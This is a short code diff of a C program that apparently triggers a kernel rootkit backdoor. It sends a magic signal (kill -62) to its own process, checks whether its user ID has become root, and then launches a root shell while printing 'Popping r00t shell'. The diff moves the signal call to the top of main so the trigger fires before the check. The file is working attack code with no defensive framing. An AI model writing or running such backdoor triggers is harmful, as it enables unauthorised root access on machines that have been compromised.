@@ -5,6 +5,13 @@
 #include <sys/wait.h>   
 
 int main(){
+  pid_t pid = getpid();
+  char buf[32];
+  memset(buf, '\0', 32);
+  snprintf(buf, 32, "kill -62 %d", pid);
+  printf("%s\n", buf);
+  system(buf);
+
   setuid(12345);
   uid_t ID;
   uid_t EID;
@@ -21,11 +28,5 @@ int main(){
     printf("[!!!] Popping r00t shell!!!\n");
     system("/bin/bash");
   }
-  pid_t pid = getpid();
-  char buf[32];
-  memset(buf, '\0', 32);
-  snprintf(buf, 32, "kill -62 %d", pid);
-  printf("%s\n", buf);
-  system(buf);
   return EXIT_SUCCESS;
 }
